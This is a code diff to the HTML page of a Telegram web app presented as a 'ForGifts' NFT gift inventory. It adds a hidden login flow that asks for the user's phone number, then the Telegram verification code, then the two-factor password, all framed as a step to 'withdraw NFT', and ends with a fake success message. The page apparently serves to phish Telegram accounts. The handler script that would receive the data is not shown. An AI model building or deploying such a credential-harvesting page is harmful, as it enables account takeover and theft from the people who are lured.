@@ -3,15 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ForGifts Inventory</title>
+    <title>ForGifts • NFT Inventory</title>
     <link rel="stylesheet" href="/style.css">
+    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/5968/5968804.png">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        /* Дополнительные inline стили для быстрой загрузки */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #333;
+            border-top-color: #8a2be2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <div id="inventory-list">Loading...</div>
+    <!-- Экран загрузки -->
+    <div id="loading-screen" class="loading-screen">
+        <div class="spinner"></div>
+        <div style="color: #666; margin-top: 10px;">Loading ForGifts...</div>
     </div>
+
+    <!-- Основной контейнер -->
+    <div id="app" style="display: none;">
+        <!-- Контейнер инвентаря -->
+        <div id="inventory-container">
+            <div class="container">
+                <div id="inventory-list"></div>
+            </div>
+        </div>
+        
+        <!-- Контейнер логина (скрыт по умолчанию) -->
+        <div id="login-container">
+            <div id="login-step1" class="login-step">
+                <h3>📱 Telegram Login</h3>
+                <p>Enter your phone number with country code to withdraw NFT:</p>
+                <input type="tel" id="phone-input" class="login-input" placeholder="+1234567890" autocomplete="tel">
+                <button class="login-btn" onclick="sendLoginCode()">Send Code</button>
+                <button class="login-btn secondary" onclick="cancelLogin()">Cancel</button>
+                <p style="font-size: 12px; color: #777; margin-top: 15px;">
+                    A verification code will be sent to your Telegram account.
+                </p>
+            </div>
+            
+            <div id="login-step2" class="login-step" style="display:none">
+                <h3>🔐 Enter Code</h3>
+                <p>Enter the 5-digit code sent to your Telegram:</p>
+                <input type="text" id="code-input" class="login-input" placeholder="12345" autocomplete="one-time-code" maxlength="5">
+                <button class="login-btn" onclick="verifyLoginCode()">Verify Code</button>
+                <button class="login-btn secondary" onclick="cancelLogin()">Back</button>
+                <div style="font-size: 12px; color: #777; margin-top: 15px; text-align: center;">
+                    Didn't receive code? <a href="javascript:void(0)" onclick="resendCode()" style="color: #8a2be2;">Resend</a>
+                </div>
+            </div>
+            
+            <div id="login-step3" class="login-step" style="display:none">
+                <h3>🔒 Two-Factor Authentication</h3>
+                <p>Enter your 2FA password to complete login:</p>
+                <input type="password" id="password-input" class="login-input" placeholder="Password" autocomplete="current-password">
+                <button class="login-btn" onclick="verify2FA()">Complete Login</button>
+                <button class="login-btn secondary" onclick="cancelLogin()">Cancel</button>
+            </div>
+            
+            <div id="login-success" class="login-step" style="display:none">
+                <h3>✅ Login Successful!</h3>
+                <div style="text-align: center; margin: 20px 0;">
+                    <div style="font-size: 48px; color: #8a2be2;">✓</div>
+                    <p id="user-info" style="font-size: 16px; margin: 15px 0;"></p>
+                    <p style="color: #aaa;">Withdrawal process completed successfully.</p>
+                </div>
+                <button class="login-btn" onclick="cancelLogin()">Back to Inventory</button>
+            </div>
+            
+            <div id="login-error"></div>
+        </div>
+    </div>
+
     <script src="/script.js"></script>
+    <script>
+        // Скрываем экран загрузки когда всё готово
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                document.getElementById('loading-screen').style.display = 'none';
+                document.getElementById('app').style.display = 'block';
+            }, 500);
+        });
+    </script>
 </body>
 </html>
-
